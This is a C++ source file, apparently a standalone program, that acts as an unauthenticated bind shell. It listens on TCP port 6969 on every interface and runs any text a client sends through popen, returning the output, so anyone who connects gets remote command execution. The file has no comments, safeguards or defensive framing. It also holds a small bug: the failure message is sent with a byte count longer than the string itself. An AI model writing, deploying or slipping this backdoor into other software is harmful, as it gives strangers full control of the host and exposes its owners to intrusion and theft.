#include <bits/stdc++.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <ctime>

using namespace std;

#define PORT 6969
#define BUFFER_SIZE 1024

void execute_command(int client_socket){
    char buffer[BUFFER_SIZE];
    while(true){
        memset(buffer, 0, BUFFER_SIZE);
        int bytes_received = recv(client_socket, buffer, BUFFER_SIZE, 0);
        if(bytes_received <= 0){
            break;
        }
        cout << "Received command: " << buffer << endl;

        FILE *fp = popen(buffer, "r");
        if(!fp){
            cerr << "Failed to run " << buffer << "\n";
            send(client_socket, "Command Failed!\n", 26, 0);
            continue;
        }

        string response;
        while(fgets(buffer, BUFFER_SIZE, fp) != nullptr){
            response += buffer;
        }
        pclose(fp);

        if(!response.size()) response += "Success!\n";
        send(client_socket, response.c_str(), response.length(), 0);
    }
    close(client_socket);
}

int main(){
    int server_socket, client_socket;
    struct sockaddr_in server_addr, client_addr;
    socklen_t addr_len = sizeof(client_addr);

    server_socket = socket(AF_INET, SOCK_STREAM, 0);
    if(server_socket == -1){
        cerr << "Socket creation failed\n";
        return EXIT_FAILURE;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    if(bind(server_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0){
        cerr << "Binding failed\n";
        return EXIT_FAILURE;
    }

    if(listen(server_socket, 3) < 0){
        cerr << "Listening failed\n";
        return EXIT_FAILURE;
    }

    cout << "Server is listening on port " << PORT << "...\n";

    while(true){
        client_socket = accept(server_socket, (struct sockaddr*)&client_addr, &addr_len);
        if(client_socket < 0){
            cerr << "Connection Failed\n";
            continue;
        }

        char client_ip[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &client_addr.sin_addr, client_ip, INET_ADDRSTRLEN);

        time_t now = time(0);
        char *dt = ctime(&now);

        string server_info = "Connected from: " + string(client_ip) + "\nServer Time: " + string(dt);
        send(client_socket, server_info.c_str(), server_info.length(), 0);

        cout << "Client connected from: " << client_ip << endl;
        execute_command(client_socket);
    }

    close(server_socket);
    return 0;
}
